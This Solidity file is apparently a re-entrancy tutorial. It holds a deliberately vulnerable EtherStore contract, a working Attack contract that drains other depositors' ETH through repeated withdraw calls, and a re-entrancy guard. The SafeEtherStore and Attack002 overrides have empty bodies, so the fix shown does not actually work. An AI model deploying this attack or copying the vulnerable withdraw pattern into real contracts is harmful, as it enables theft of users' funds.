// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Re-Entrancy
Vulnerability
Let's say that contract A calls contract B.

Reentracy exploit allows B to call back into A before A finishes execution.

EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
 */
contract EtherStore001 {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public virtual {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack001 {
    EtherStore001 public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore001(_etherStoreAddress);
    }

    // Receive is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable virtual {
        require(msg.value >= 1 ether, "Minimum is 1 ether");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/*
Preventative Techniques
- Ensure all state changes happen before calling external contracts
- Use function modifiers that prevent re-entrancy
Here is a example of a re-entracy guard
*/
contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract SafeEtherStore001 is EtherStore001, ReEntrancyGuard {
    function withdraw() public override noReentrant {}
}

contract Attack002 is Attack001 {
    constructor(address _safeEtherStore) Attack001(_safeEtherStore) {}

    function attack() external payable override {}
}
